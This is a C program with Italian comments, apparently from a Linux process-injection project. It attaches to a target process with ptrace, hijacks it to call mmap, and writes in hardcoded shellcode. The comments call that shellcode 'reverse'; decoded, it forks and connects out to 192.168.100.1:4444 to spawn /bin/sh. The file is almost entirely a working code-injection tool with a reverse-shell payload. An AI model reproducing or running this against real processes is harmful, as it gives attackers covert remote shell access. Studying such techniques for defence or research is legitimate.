/*
 * Foreign Memory Allocation via ptrace
 * 
 * Esegue mmap in processo remoto tramite syscall injection,
 * poi inietta ed esegue shellcode nella memoria allocata.
 * 
 * Credits: linux-prinj di Philippe Grégoire
 * https://gitlab.com/pgregoire/linux-prinj/
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stdint.h>

#include "../common/ptrace_utils.h"
#include "../common/utils.h"


// lo shellcode inizia con due nop, per gestire decremento rip dopo interruzione syscall
// compilato da ../shellcodes/reverse.asm
unsigned char shellcode[] = {
  0x90, 0x90, 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x83, 0xf8,
  0x00, 0x74, 0x02, 0xcd, 0x03, 0x48, 0x31, 0xf6, 0x48, 0xf7, 0xe6, 0x48,
  0xff, 0xc6, 0x6a, 0x02, 0x5f, 0x04, 0x29, 0x0f, 0x05, 0x48, 0x93, 0x52,
  0x68, 0xc0, 0xa8, 0x64, 0x01, 0x66, 0x68, 0x11, 0x5c, 0x66, 0x6a, 0x02,
  0x48, 0x89, 0xdf, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58,
  0x0f, 0x05, 0x48, 0x31, 0xf6, 0x6a, 0x03, 0x5e, 0xb8, 0x21, 0x00, 0x00,
  0x00, 0x48, 0x89, 0xdf, 0x48, 0xff, 0xce, 0x0f, 0x05, 0x75, 0xf1, 0x48,
  0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
  0x00, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0,
  0x3b, 0x0f, 0x05
};
int sc_len = 111;

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);

    // Attach
    if (ptrace_attach(pid) < 0) {
        perror("Errore attach");
        return 1;
    }

    // Salva registri
    struct user_regs_struct regs_orig, regs_mod;
    if (ptrace_getregs(pid, &regs_orig) < 0) {
        perror("Errore lettura registri");
        ptrace_detach(pid);
        return 1;
    }
    memcpy(&regs_mod, &regs_orig, sizeof(regs_orig));

    // Setup mmap syscall
    regs_mod.rax = 9;              // __NR_mmap
    regs_mod.rdi = 0;              // addr = NULL
    regs_mod.rsi = sc_len;         // length
    regs_mod.rdx = 0x5;            // PROT_READ | PROT_EXEC
    regs_mod.r10 = 0x22;           // MAP_PRIVATE | MAP_ANONYMOUS
    regs_mod.r8  = (unsigned long)-1;
    regs_mod.r9  = 0;

    if (ptrace_setregs(pid, &regs_mod) < 0) {
        perror("Errore setup syscall");
        ptrace_detach(pid);
        return 1;
    }

    // Backup opcode (2 Byte) e scrivi syscall
    //long backup_opcode = ptrace_peek(pid, regs_orig.rip);
    uint16_t backup_opcode;
    
    if (procfs_proc_mem_read(regs_orig.rip, pid, &backup_opcode, 2) != 0) {
        perror("Errore lettura opcode");
        ptrace_detach(pid);
        return 1;
    }

    uint16_t syscall_opcode = 0x050f;
    if (procfs_proc_mem_write(regs_orig.rip, pid, &syscall_opcode, 2) < 0) { //ptrace_poke(pid, regs_orig.rip, OPCODE_SYSCALL)
        perror("Errore inject syscall");
        ptrace_detach(pid);
        return 1;
    }

    // Esegui syscall
    if (ptrace_step(pid) < 0) {
        perror("Errore singlestep");
        ptrace_detach(pid);
        return 1;
    }

    // Leggi indirizzo allocato
    if (ptrace_getregs(pid, &regs_mod) < 0) {
        perror("Errore lettura RAX");
        ptrace_detach(pid);
        return 1;
    }

    unsigned long mmap_addr = regs_mod.rax;
    printf("[+] mmap: 0x%lx (%du bytes)\n", mmap_addr, sc_len);

    // Ripristina opcode
    if (procfs_proc_mem_write(regs_orig.rip, pid, &backup_opcode, 2) < 0) { //ptrace_poke(pid, regs_orig.rip, backup_opcode)
        perror("Errore ripristino opcode");
        ptrace_detach(pid);
        return 1;
    }

    // Inietta shellcode
    if (procfs_proc_mem_write(mmap_addr, pid, shellcode, sc_len) < 0) { //ptrace_write(pid, mmap_addr, shellcode, sc_len)
        perror("Errore scrittura shellcode");
        ptrace_detach(pid);
        return 1;
    }
    
    printf("[+] Shellcode iniettato a 0x%lx\n", mmap_addr); 
    memcpy(&regs_mod, &regs_orig, sizeof(regs_orig));

    // Redirect RIP
    //unsigned long backup_rip = regs_orig.rip;
    regs_mod.rip = mmap_addr+2 ;
    if (ptrace_setregs(pid, &regs_mod) < 0) {
        perror("Errore redirect RIP");
        ptrace_detach(pid);
        return 1;
    }

    // Esegui shellcode
    if (ptrace_cont(pid, 0) < 0) {
        perror("Errore continue");
        ptrace_detach(pid);
        return 1;
    }

    printf("[+] Hit breakpoint (INT 3)\n");

    // Wait shellcode (deve finire con int3)
    if (waitpid(pid, NULL, 0) != pid) {
        perror("Errore wait");
        ptrace_detach(pid);
        return 1;
    }
    printf("[+] Shellcode eseguito\n");
    printf("[+] Ripristino processo\n");
    // Ripristina registri originali 
    if (ptrace_setregs(pid, &regs_orig) < 0) {
        perror("Errore ripristino RIP");
        ptrace_detach(pid);
        return 1;
    }

    // Cleanup
    ptrace_detach(pid);

    printf("[+] Completato\n");
    return 0;
}

